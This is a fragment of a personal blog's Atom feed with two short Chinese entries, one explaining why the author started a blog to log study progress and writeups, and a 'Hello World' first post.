      &lt;h1 id=&quot;为什么搭博客？&quot;&gt;&lt;a href=&quot;#为什么搭博客？&quot; class=&quot;headerlink&quot; title=&quot;为什么搭博客？&quot;&gt;&lt;/a&gt;为什么搭博客？&lt;/h1&gt;&lt;p&gt;&lt;del&gt;还不是因为无聊，学习是不可能的，这辈子都不可能学习；打LOL又嫌舍友太菜。&lt;/del&gt;&lt;br&gt;开个玩笑，搭建自己的博客主要还是因为记录下自己的学习成长过程嘛，队里的大佬都有自己的Blog，自己也不好意思落下，有空的上传下自己的做题的writeup或复现还是不错的。&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>MyFirst</title>
    <link href="https://cy9nusg4rd3n.github.io/2018/11/07/MyFirst/"/>
    <id>https://cy9nusg4rd3n.github.io/2018/11/07/MyFirst/</id>
    <published>2018-11-07T14:39:01.000Z</published>
    <updated>2018-11-07T14:45:41.473Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="第一篇博客"><a href="#第一篇博客" class="headerlink" title="第一篇博客"></a>第一篇博客</h1><blockquote><p>Hello World！</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla
      
    
    </summary>
    
    
  </entry>
  
</feed>
